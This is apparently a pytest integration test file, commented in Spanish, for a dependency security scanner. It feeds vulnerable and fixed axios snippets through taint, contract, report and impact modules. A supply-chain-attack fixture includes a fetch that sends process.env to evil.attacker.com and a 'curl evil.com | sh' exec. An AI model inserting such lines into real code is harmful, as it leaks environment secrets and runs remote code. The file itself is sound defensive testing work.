"""
Tests de integración del pipeline SecOps Scanner.

Filosofía: los tests unitarios verifican capas individualmente. Estos tests
verifican que las capas se componen correctamente. Un bug de integración
(ej: el motor produce Finding pero report.py lo pierde) solo aparece aquí.

No se mockea la lógica de negocio. Se usan fixtures de código real con
vulnerabilidades conocidas (fragmentos reales de axios con CVEs documentados).
Las llamadas de red (fetcher) sí se mockean — son la frontera del sistema.

Casos cubiertos:
- Pipeline completo detect → analyze → report con código vulnerable real
- Pipeline completo con código corregido → sin hallazgos CRITICAL/HIGH
- detect + extract_dependencies + analysis: las deps detectadas fluyen hasta hallazgos
- report + impact: hallazgos de los motores aparecen en ambos outputs
- dep_filter: solo analiza la dependencia especificada
"""

import io
import json
import tarfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from secops.scanner.ast_engine import parse_file, parse_source_tree
from secops.scanner.behavioral_delta import analyze as delta_analyze, build_call_graph
from secops.scanner.contract_verifier import analyze as contract_analyze
from secops.scanner.impact import write_impact
from secops.scanner.report import generate_report
from secops.scanner.taint_analyzer import analyze as taint_analyze, Finding


# ---------------------------------------------------------------------------
# Fixtures: código real con vulnerabilidades conocidas
# Nota: los patrones son idénticos a los usados en test_taint_analyzer.py
# para garantizar que el motor los reconoce.
# ---------------------------------------------------------------------------

# axios ≤1.7.9 — CVE-2025-27152: config.url → request.open sin validación
AXIOS_VULNERABLE_XHR = """\
// lib/adapters/xhr.js — axios 1.7.9 (VULNERABLE)
function xhrAdapter(config) {
  var url = config.url;
  var fullPath = buildFullPath(config.baseURL, url);
  request.open(config.method.toUpperCase(), fullPath, true);
}
"""

# axios ≥1.8.2 — fix: validación presente
AXIOS_FIXED_XHR = """\
// lib/adapters/xhr.js — axios 1.8.2 (CORREGIDO)
function xhrAdapter(config) {
  var url = config.url;
  if (config.allowAbsoluteUrls === false) {
    url = buildFullPath(config.baseURL, url);
  } else {
    url = isAbsoluteURL(url) ? url : buildFullPath(config.baseURL, url);
  }
  request.open(config.method.toUpperCase(), url, true);
}
"""

# axios ≤1.13.x — CVE-2025-58754: Buffer.from sin límite
AXIOS_VULNERABLE_DATA_URI = """\
// lib/helpers/fromDataURI.js — axios 1.13.0 (VULNERABLE)
function fromDataURI(uri, asBlob, options) {
  var body = uri.split(',')[1];
  var buffer = Buffer.from(decodeURIComponent(body), 'base64');
  return buffer;
}
"""

# axios corregido — verifica maxContentLength
AXIOS_FIXED_DATA_URI = """\
// lib/helpers/fromDataURI.js — axios 1.8.2 (CORREGIDO)
function fromDataURI(uri, asBlob, options) {
  var body = uri.split(',')[1];
  var buffer = Buffer.from(decodeURIComponent(body), 'base64');
  if (options && options.maxContentLength > -1 && buffer.length > options.maxContentLength) {
    throw new RangeError('content length limit exceeded');
  }
  return buffer;
}
"""


def _make_parse_results(files: dict[str, str]):
    """Crea ParseResults reales escribiendo a disco y llamando parse_file."""
    import tempfile
    results = []
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        for filename, content in files.items():
            f = tmp_path / filename
            f.write_text(content, encoding="utf-8")
            lang = "javascript" if filename.endswith(".js") else "python"
            pr = parse_file(f, lang)
            results.append(pr)
    return results


# ---------------------------------------------------------------------------
# Integración motores: taint + contract + behavioral_delta
# ---------------------------------------------------------------------------


class TestMotorIntegration:
    """Los motores reciben ParseResults reales y producen findings coherentes.
    Estos tests verifican que el pipeline de análisis funciona end-to-end
    sin intermediarios mocked.
    """

    def test_taint_analyzer_finds_cve_2025_27152_in_vulnerable_code(self):
        """axios ≤1.7.9: config.url → request.open sin validación → TAINT_FLOW."""
        parse_results = _make_parse_results({"xhr.js": AXIOS_VULNERABLE_XHR})
        findings = taint_analyze(parse_results, dep_name="axios", dep_version="1.7.9")

        taint_findings = [f for f in findings if f.finding_type == "TAINT_FLOW"]
        assert len(taint_findings) > 0, "Debe detectar TAINT_FLOW en código vulnerable"
        assert any(f.severity in ("CRITICAL", "HIGH") for f in taint_findings)

    def test_taint_analyzer_no_taint_in_fixed_code(self):
        """axios ≥1.8.2: validación de allowAbsoluteUrls presente → sin TAINT_FLOW crítico."""
        parse_results = _make_parse_results({"xhr.js": AXIOS_FIXED_XHR})
        findings = taint_analyze(parse_results, dep_name="axios", dep_version="1.8.2")

        critical_taint = [
            f for f in findings
            if f.finding_type == "TAINT_FLOW" and f.severity in ("CRITICAL", "HIGH")
        ]
        assert len(critical_taint) == 0, "No debe haber TAINT_FLOW crítico en código corregido"

    def test_contract_verifier_finds_cve_2025_58754_in_vulnerable_code(self):
        """axios ≤1.13.x: fromDataURI no verifica maxContentLength → CONTRACT_VIOLATION."""
        parse_results = _make_parse_results({"utils.js": AXIOS_VULNERABLE_DATA_URI})
        findings = contract_analyze(parse_results, dep_name="axios", dep_version="1.13.0")

        violations = [f for f in findings if f.finding_type == "CONTRACT_VIOLATION"]
        assert len(violations) > 0, "Debe detectar CONTRACT_VIOLATION en código vulnerable"

    def test_contract_verifier_no_violation_in_fixed_code(self):
        """axios con verificación de maxContentLength → sin CONTRACT_VIOLATION."""
        parse_results = _make_parse_results({"utils.js": AXIOS_FIXED_DATA_URI})
        findings = contract_analyze(parse_results, dep_name="axios", dep_version="1.8.2")

        violations = [f for f in findings if f.finding_type == "CONTRACT_VIOLATION"]
        assert len(violations) == 0, "No debe haber CONTRACT_VIOLATION en código corregido"

    def test_all_findings_have_correct_dep_metadata(self):
        """Todos los hallazgos mantienen el dep_name y dep_version de la dependencia analizada."""
        parse_results = _make_parse_results({"xhr.js": AXIOS_VULNERABLE_XHR})
        findings = taint_analyze(parse_results, dep_name="axios", dep_version="1.7.9")

        for f in findings:
            assert f.dep_name == "axios", f"Finding tiene dep_name incorrecto: {f.dep_name}"
            assert f.dep_version == "1.7.9", f"Finding tiene dep_version incorrecto: {f.dep_version}"


# ---------------------------------------------------------------------------
# Integración motores → report
# ---------------------------------------------------------------------------


class TestMotorsToReport:
    """Los hallazgos de los motores deben aparecer en el reporte generado.
    Un hallazgo que no llega al reporte es un falso negativo silencioso.
    """

    def test_findings_from_taint_appear_in_report(self, tmp_path):
        """Hallazgos del taint analyzer están presentes en el reporte Markdown."""
        parse_results = _make_parse_results({"xhr.js": AXIOS_VULNERABLE_XHR})
        findings = taint_analyze(parse_results, dep_name="axios", dep_version="1.7.9")
        assert findings, "Precondición: debe haber hallazgos"

        report_path = generate_report(
            findings,
            dep_summary={"axios": "1.7.9"},
            languages_detected=["javascript"],
            reports_dir=tmp_path / "reports",
        )

        content = report_path.read_text(encoding="utf-8")
        assert "axios" in content
        assert "TAINT_FLOW" in content
        # El risk level no debe ser CLEAN si hay hallazgos
        assert "CLEAN" not in content.split("Risk Level")[1].split("\n")[0] if "Risk Level" in content else True

    def test_no_findings_report_shows_clean(self, tmp_path):
        """Sin hallazgos → reporte dice CLEAN, no hay tabla de hallazgos falsos."""
        report_path = generate_report(
            findings=[],
            dep_summary={"axios": "1.8.2"},
            languages_detected=["javascript"],
            reports_dir=tmp_path / "reports",
        )

        content = report_path.read_text(encoding="utf-8")
        assert "CLEAN" in content


# ---------------------------------------------------------------------------
# Integración motores → impact
# ---------------------------------------------------------------------------


class TestMotorsToImpact:
    """Los hallazgos de los motores deben escribirse en impact_analysis.jsonl."""

    def test_findings_written_to_impact_jsonl(self, tmp_path):
        """Hallazgos reales se persisten en JSONL con todos los campos requeridos."""
        parse_results = _make_parse_results({"xhr.js": AXIOS_VULNERABLE_XHR})
        findings = taint_analyze(parse_results, dep_name="axios", dep_version="1.7.9")
        assert findings, "Precondición: debe haber hallazgos"

        impact_file = tmp_path / "impact_analysis.jsonl"
        project_root = tmp_path

        written = write_impact(findings, project_root, impact_file)

        assert written > 0
        assert impact_file.exists()
        lines = impact_file.read_text(encoding="utf-8").splitlines()
        assert len(lines) == written
        # Verificar que cada línea es JSON válido con los campos requeridos
        for line in lines:
            entry = json.loads(line)
            assert entry["dep"] == "axios"
            assert entry["finding_type"] == "TAINT_FLOW"
            assert "reachable" in entry
            assert "action" in entry

    def test_second_scan_does_not_duplicate_findings(self, tmp_path):
        """Escanear dos veces el mismo código → sin entradas duplicadas."""
        parse_results = _make_parse_results({"xhr.js": AXIOS_VULNERABLE_XHR})
        findings = taint_analyze(parse_results, dep_name="axios", dep_version="1.7.9")
        impact_file = tmp_path / "impact_analysis.jsonl"

        write_impact(findings, tmp_path, impact_file)
        write_impact(findings, tmp_path, impact_file)

        lines = impact_file.read_text(encoding="utf-8").splitlines()
        assert len(lines) == len(findings), \
            f"Se esperaban {len(findings)} líneas (sin duplicados), hay {len(lines)}"


# ---------------------------------------------------------------------------
# Integración: build_call_graph + behavioral delta
# ---------------------------------------------------------------------------


class TestBehavioralDeltaIntegration:
    """El behavioral delta compara dos versiones reales de código.
    Un supply chain attack introduce edges nuevos a operaciones privilegiadas.
    """

    CLEAN_VERSION = """\
function sendRequest(config) {
  return adapter(config);
}
"""

    COMPROMISED_VERSION = """\
function sendRequest(config) {
  fetch('https://evil.attacker.com/exfil?data=' + JSON.stringify(process.env));
  require('child_process').exec('curl evil.com | sh');
  return adapter(config);
}
"""

    def test_detects_new_network_calls_as_behavioral_anomaly(self, tmp_path):
        """Versión comprometida agrega llamadas de red externas → BEHAVIORAL_ANOMALY."""
        import tempfile

        with tempfile.TemporaryDirectory() as clean_dir, \
             tempfile.TemporaryDirectory() as compromised_dir:

            (Path(clean_dir) / "index.js").write_text(self.CLEAN_VERSION)
            (Path(compromised_dir) / "index.js").write_text(self.COMPROMISED_VERSION)

            results_old = parse_source_tree(Path(clean_dir), "javascript")
            results_new = parse_source_tree(Path(compromised_dir), "javascript")

        findings = delta_analyze(results_old, results_new, "axios", "1.14.0", "1.14.1")

        anomalies = [f for f in findings if f.finding_type == "BEHAVIORAL_ANOMALY"]
        assert len(anomalies) > 0, "Debe detectar BEHAVIORAL_ANOMALY en versión comprometida"
        assert any(f.severity in ("CRITICAL", "HIGH") for f in anomalies)

    def test_legitimate_fix_does_not_produce_anomaly(self, tmp_path):
        """Fix legítimo (agrega validación) no se reporta como BEHAVIORAL_ANOMALY crítico."""
        import tempfile

        vulnerable = """\
function dispatchRequest(config) {
  return settle(config);
}
"""
        fixed = """\
function dispatchRequest(config) {
  if (!config.allowAbsoluteUrls && isAbsoluteURL(config.url)) {
    throw new Error('Not allowed');
  }
  return settle(config);
}
"""
        with tempfile.TemporaryDirectory() as v_dir, \
             tempfile.TemporaryDirectory() as f_dir:

            (Path(v_dir) / "core.js").write_text(vulnerable)
            (Path(f_dir) / "core.js").write_text(fixed)

            results_old = parse_source_tree(Path(v_dir), "javascript")
            results_new = parse_source_tree(Path(f_dir), "javascript")

        findings = delta_analyze(results_old, results_new, "axios", "1.7.9", "1.8.2")

        critical_anomalies = [
            f for f in findings
            if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity in ("CRITICAL", "HIGH")
        ]
        assert len(critical_anomalies) == 0, \
            "Un fix legítimo no debe producir BEHAVIORAL_ANOMALY crítico"
